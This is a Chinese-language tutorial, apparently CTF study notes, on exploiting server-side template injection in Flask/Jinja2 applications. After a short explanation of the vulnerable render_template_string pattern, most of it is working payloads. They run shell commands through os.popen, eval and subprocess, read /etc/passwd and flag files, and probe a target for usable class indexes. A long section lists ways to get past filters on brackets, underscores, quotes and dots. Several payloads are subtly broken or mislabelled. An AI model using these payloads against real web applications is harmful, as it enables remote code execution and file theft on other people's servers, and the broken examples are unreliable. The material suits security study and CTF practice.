# SSTI_OF_FLASK




# 前言

之前一直是套着公式去做ssti的题目，遇到需要一些变化的，可能就会卡住了，所以这里打算学习并梳理一下关于Python中SSTI的知识点



# Flask

首先，是python是SSTI，那么就离不开flask，这里用一个简单的flask demo来介绍一下他的模板渲染

构造如下的代码，以及目录结构

目录结构

```
├── app.py  
└── templates  
    └── index.html
```

app.py内容

```python
from flask import Flask
from flask import render_template
from flask import request
from flask import render_template_string
app = Flask(__name__)

@app.route('/')
@app.route('/index')
def index():
   return render_template("index.html",user=request.args.get("name"))

if __name__ == '__main__':
    app.run(debug=True)
```

index.html的内容

```html
<html>
  <head>
    <title>SSTI</title>
  </head>
 <body>
      <h1>Hello, {{user.name}}!</h1>
  </body>
</html>
```

可以看到这里是已经可以进行模板的渲染了，但是我们的`{{7*7}}`没有被渲染，这是因为这是正确的写法，并不存在SSTI漏洞

![image-20220723210736546](https://tuchuang.huamang.xyz/img/image-20220723210736546.png)

而什么情况才会存在SSTI的漏洞呢，很多很多的安全漏洞都源于程序员偷懒的不规范代码，这里也是，假如有个很小的功能点但是开发者不愿意创建一个html文件，选择直接用字符串插入html的话，那么漏洞可能就来了,比如下面这个demo

```
@app.route('/test')
def test():
    template = """
        <div class="center-content">
        <p>Hello, %s</p>
    </div>
    """ % (request.args.get('name'))
    return render_template_string(template)

```

可以看到，这里是成功解析了的

![image-20220723212821812](https://tuchuang.huamang.xyz/img/image-20220723212821812.png)

# 攻击原理

那么知道了漏洞存在了以后，我们改怎么利用，我们把最终的目标放在RCE，那么我们怎么才能在双大括号里面RCE，这就得从python语言来说起了，这里先给出几个核心的方法

```
__class__ 取类
__bases__[0] 拿基类
__base__ 拿基类
__mro__ 返回一个类的调用顺序，__mro__[1]或者__mro__[-1]拿到基类
__subclasses__() 返回子类集合
__init__  类的初始化方法，所有自带带类都包含init方法，便于利用他当跳板来调用globals
__globals__  function.__globals__，用于获取function所处空间下可使用的module、方法以及所有变量
__builtins__  是一个包含了大量内置函数的一个模块
```

python中所有的类的基类，都是object，我们可以这样获取类

**xx.\_\_class\_\_**，例如字符串，元组，列表



![image-20220723224813292](https://tuchuang.huamang.xyz/img/image-20220723224813292.png)



在python中每个类都有一个**bases**属性，这个的意思就是**基类**，也就是之前提到的object



![image-20220723231849079](https://tuchuang.huamang.xyz/img/image-20220723231849079.png)



拿到基层的object，我们就可以往其他的方向去发展了，这里就用到了一个**subclasses**() 方法，他的作用是：返回的是这个类的子类的集合，也就是object类的子类的集合

![image-20220723234404088](https://tuchuang.huamang.xyz/img/image-20220723234404088.png)

那么就可以供我们挑选了，我们找到可以利用的类，选中来利用，例如这里的<class 'os._wrap_close'>

不同版本的python可能会在不用的位置，我的环境里是`"".__class__.__bases__[0].__subclasses__()[133]`



![image-20220723235402485](https://tuchuang.huamang.xyz/img/image-20220723235402485.png)

这里就到了下一个点，`.init.globals`，这个init用来初始化类，globals用来全局查找所有方法和变量及参数

![image-20220723235527394](https://tuchuang.huamang.xyz/img/image-20220723235527394.png)

可以发现，这里是有popen的，这个就可以命令执行了



![image-20220723235628539](https://tuchuang.huamang.xyz/img/image-20220723235628539.png)

这样就可以rce了

```
{{"".__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['popen']('ls').read()}}
```



![image-20220723235742273](https://tuchuang.huamang.xyz/img/image-20220723235742273.png)

当然这只是其中一个方法，在获取到了object后，能走的路非常多，获取object的方法也很多

比如`__mro__`，这个就可以用来获取基类，他会返回一个类的调用顺序，其中就必定会有object

![image-20220724001442014](https://tuchuang.huamang.xyz/img/image-20220724001442014.png)



# 利用

## 找利用链

这里我们可以用脚本来跑出我们想要的东西

本地

```python
search = 'popen'
num = -1
for i in ().__class__.__bases__[0].__subclasses__():
    num += 1
    try:
        if search in i.__init__.__globals__.keys():
            print(i, num)
    except:
        pass
```

```python
count = -1
for i in ''.__class__.__mro__[-1].__subclasses__():
	count += 1
	if "warpper" in repr(i.__init__):
		pass
	else:
		try:
			if "os" in repr(i.__init__.__globals__):
				print(count, i)
		except:
			pass
```



远程

```python
import json

a = """
<class 'type'>,...,<class 'subprocess.Popen'>
"""

num = 0
allList = []

result = ""
for i in a:
    if i == ">":
        result += i
        allList.append(result)
        result = ""
    elif i == "\n" or i == ",":
        continue
    else:
        result += i
        
for k,v in enumerate(allList):
    if "os._wrap_close" in v:
        print(str(k)+"--->"+v)
```

或者直接利用题目环境直接搜出来，例如：

```
查看warnings.catch_warnings方法的位置
[].__class__.__base__.__subclasses__().index(warnings.catch_warnings)
查看linecatch的位置
[].__class__.__base__.__subclasses__()[59].__init__.__globals__.keys().index('linecache')

剩下的以此类推
```



## RCE

### eval

首先，题目环境的不一样可能需要我们去找环境中含有内建函数 eval 的子类的索引号

这里脚本的原理就是通过遍历`__subclasses__`，然后再通过`.__init__.__globals__['__builtins__']`里面找是否存在eval函数字眼

```python
import requests

for i in range(500):
    url = "http://xxx/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__['__builtins__']}}"

    res = requests.get(url=url)
    if 'eval' in res.text:
        print(i)
```

我们可以记下几个含有eval函数的类：

- warnings.catch_warnings
- WarningMessage
- codecs.IncrementalEncoder
- codecs.IncrementalDecoder
- codecs.StreamReaderWriter
- os._wrap_close
- reprlib.Repr
- weakref.finalize

示例payload

```
{{''.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
```

### os模块

Python的 os 模块中有system和popen这两个函数可用来执行命令，system没有回显，popen有回显

而找os模块的方法就和上面的差不多，可以编写脚本，遍历subclass的类里的`__init__.__globals__`

查找里面有没有导入os模块

```python
import requests

for i in range(500):
    url = "http://xxx/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__}}"

    res = requests.get(url=url, headers=headers)
    if 'os.py' in res.text:
        print(i)
```

示例payload

```
{{''.__class__.__bases__[0].__subclasses__()[79].__init__.__globals__['os'].popen('ls /').read()}}
```

### subprocess.popen类

subprocess 意在替代其他几个老的模块或者函数，比如：`os.system`、`os.popen` 等函数。

```python
import requests

for i in range(500):
    url = "http://xxx/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"]}}"

    res = requests.get(url=url, headers=headers)
    if 'linecache' in res.text:
        print(i)
```

则构造如下payload执行命令即可：

```php
{{[].__class__.__base__.__subclasses__()[245]('ls /',shell=True,stdout=-1).communicate()[0].strip()}}
```

### linecache 函数

linecache 这个函数可用于读取任意一个文件的某一行，而这个函数中也引入了 os 模块

```python
import requests

for i in range(500):
    url = "http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__}}"

    res = requests.get(url=url, headers=headers)
    if 'linecache' in res.text:
        print(i)
```

示例payload

```
{{[].__class__.__base__.__subclasses__()[168].__init__.__globals__['linecache']['os'].popen('ls /').read()}}{{[].__class__.__base__.__subclasses__()[168].__init__.__globals__.linecache.os.popen('ls /').read()}}
```

### lipsum

前段时间兴起的一条路，非常方便的可以进行rce

```python
{{lipsum.__globals__['os'].popen('whoami').read()}}
{{lipsum.__globals__.os.popen('whoami').read()}}
{{lipsum.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")}}
```



## 文件读取

如果实在没有命令执行，那就看看有没有文件读取的操作

python2中file类可以直接用来读取文件

```
{{[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()}}
```

python3中没有这个file类，可以用`<class '_frozen_importlib_external.FileLoader'> `这个类去读取文件。

```
import requests

for i in range(500):
    url = "http://xxx/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"]}}"

    res = requests.get(url=url, headers=headers)
    if 'FileLoader' in res.text:
        print(i)
```

示例payload

```
{{().__class__.__bases__[0].__subclasses__()[79]["get_data"](0, "/etc/passwd")}}
```

# Bypass

## {{

绕过方法

`\{%print()%\}`

```
{% if ... %}1{% endif %}
{%set c=xxx %}
```



## []

过滤了[]后，我们payload有几个地方就过不去了

```
{{"".__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['popen']('ls').read()}}
```

### getitem

那么这里就可以利用函数`getitem()`进行获取列表元素，payload就变成这样

```
{{"".__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['popen']('ls').read()}}
```

![image-20220724000650617](https://tuchuang.huamang.xyz/img/image-20220724000650617.png)

### pop

最好不要用pop()，因为pop()会删除相应位置的值

```
{{''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()}}// 指定序列属性

{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.pop('__builtins__').pop('eval')('__import__("os").popen("ls /").read()')}}// 指定字典属性
```

### 字典

我们知道访问字典里的值有两种方法，一种是把相应的键放入熟悉的方括号 `[]` 里来访问，一种就是用点 `.` 来访问。所以，当方括号 `[]` 被过滤之后，我们还可以用点 `.` 的方式来访问，如下示例

```php
__builtins__.eval()

{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.__builtins__.eval('__import__("os").popen("ls /").read()')}}
```

等同于：

```php
[__builtins__]['eval']()

{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
```

## _

利用request对象绕过

```php
{{()[request.args.class][request.args.bases][0][request.args.subclasses]()[40]('/flag').read()}}&class=__class__&bases=__bases__&subclasses=__subclasses__

{{()[request.args.class][request.args.bases][0][request.args.subclasses]()[77].__init__.__globals__['os'].popen('ls /').read()}}&class=__class__&bases=__bases__&subclasses=__subclasses__
```

等同于：

```php
{{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
```

## 引号'

### 利用chr()绕过

先获取chr()函数，赋值给chr，后面再拼接成一个字符串

```
{% set chr=().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.[0].__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}

# {% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}

等同
{{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}
```

### 利用request对象绕过

示例：

```
{{().__class__.__bases__[0].__subclasses__().pop(40)(request.args.path).read()}}&path=/etc/passwd

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__[request.args.os].popen(request.args.cmd).read()}}&os=os&cmd=ls /

等同于：

{{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
```

如果过滤了args，可以将其中的request.args改为request.values，POST和GET两种方法传递的数据request.values都可以接收。

## 点.

### 利用 `|attr()` 绕过（适用于flask）

如果 `.` 也被过滤，且目标是JinJa2（flask）的话，可以使用原生JinJa2函数`attr()`，即：

```php
().__class__   =>  ()|attr("__class__")
```

示例

```php
{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(77)|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("ls /")|attr("read")()}}

等同于
{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
```

### 利用中括号[ ]绕过

如下示例：

```php
{{''['__class__']['__bases__'][0]['__subclasses__']()[59]['__init__']['__globals__']['__builtins__']['eval']('__import__("os").popen("ls").read()')}}

等同于：

{{().__class__.__bases__.[0].__subclasses__().[59].__init__['__globals__']['__builtins__'].eval('__import__("os").popen("ls /").read()')}}
```

## 组合绕过

### . + []

```python
{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(77)|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("ls")|attr("read")()}}
```

### __ +.+[]

原payload

```php
{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
```

用 `__getitem__()`来绕过

由于还过滤了下划线 `__`，我们可以用request对象绕过，但是还过滤了中括号 `[]`，所以我们要时绕过 `__`和 `[`，就用到了我们的`|attr()`

最后

```php
{{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(77)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)}}&x1=__class__&x2=__base__&x3=__subclasses__&x4=__getitem__&x5=__init__&x6=__globals__&x7=__builtins__&x8=eval&x9=__import__("os").popen('ls /').read()
```

### '+"

```php
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}&path=/etc/passwd
```

### _+'+"

```php
{{''[request.args.class][request.args.mro][2]request.args.subclasses.read() }}&class=_class__&mro=_mro__&subclasses=__subclasses__
```

### _ +. +'

```php
{{"".__class__}}
{{""["\\x5f\\x5fclass\\x5f\\x5f"]}}
 
{{""["\\x5f\\x5fclass\\x5f\\x5f"]["\\x5F\\x5Fbases\\x5F\\x5F"][0]["\\x5F\\x5Fsubclasses\\x5F\\x5F"]()[91]["get\\x5Fdata"](0, "/flag")}}
#也就是
{{"".__class__.__bases__[0].__subclasses__()[91].get_data(0,"/flag")}}
```





# 参考文章

https://xz.aliyun.com/t/7746

https://xz.aliyun.com/t/9584

https://www.freebuf.com/articles/network/258136.html

https://hoad-sc.blog.csdn.net/article/details/113778233 

https://xz.aliyun.com/t/6885 

https://www.freebuf.com/articles/web/264088.html

http://h0cksr.xyz/archives/340

